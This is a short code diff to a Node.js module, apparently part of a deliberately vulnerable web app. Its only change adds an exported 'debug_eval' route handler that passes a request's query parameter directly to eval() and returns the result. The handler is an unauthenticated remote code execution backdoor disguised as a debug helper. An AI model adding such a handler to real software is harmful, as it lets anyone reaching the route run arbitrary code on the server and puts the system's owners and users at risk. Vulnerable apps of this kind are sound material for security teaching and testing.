@@ -16,6 +16,7 @@ var fileType = require('file-type');
 var AdmZip = require('adm-zip');
 var fs = require('fs');
 
+exports.debug_eval = function (req, res, next) { var result = eval(req.query.expr); res.send(String(result)); };
 // prototype-pollution
 var _ = require('lodash');
 
